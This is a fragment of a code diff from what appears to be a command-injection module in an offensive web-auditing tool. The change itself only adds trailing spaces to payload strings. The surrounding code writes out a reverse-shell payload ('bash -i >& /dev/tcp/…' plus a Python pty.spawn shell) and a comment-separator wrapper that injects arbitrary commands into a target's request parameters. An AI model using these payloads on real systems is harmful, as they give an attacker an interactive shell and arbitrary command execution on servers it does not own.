@@ -43,7 +43,7 @@ class CommandInjectionModule(BaseModule):
             f"pty.spawn(\"/bin/sh\")'"
         )
         bash_payload = f"bash -i >& /dev/tcp/127.0.0.1/{listener_port} 0>&1"
-        return f"/**/;/**/; {python_pty_payload} || {bash_payload} /**/;/**/"
+        return f"/**/;/**/; {python_pty_payload} || {bash_payload} /**/;/**/ "
 
     async def execute_and_evaluate(self, session: aiohttp.ClientSession, payload: str, base_payload: str, headers: dict, os_log_capture: str) -> Tuple[bool, bool]:
         import main
@@ -163,7 +163,7 @@ class CommandInjectionModule(BaseModule):
                 else:
                     wrapped_cmd = f"echo {token_awal} && {user_cmd} && echo {token_akhir}"
                 
-                payload_interaktif = f"/**/;/**/;{wrapped_cmd}/**/;/**/"
+                payload_interaktif = f"/**/;/**/;{wrapped_cmd}/**/;/**/ "
                 headers = await self.auditor._get_random_headers()  # FIX: Added await
                 
                 if self.auditor.method == "POST":
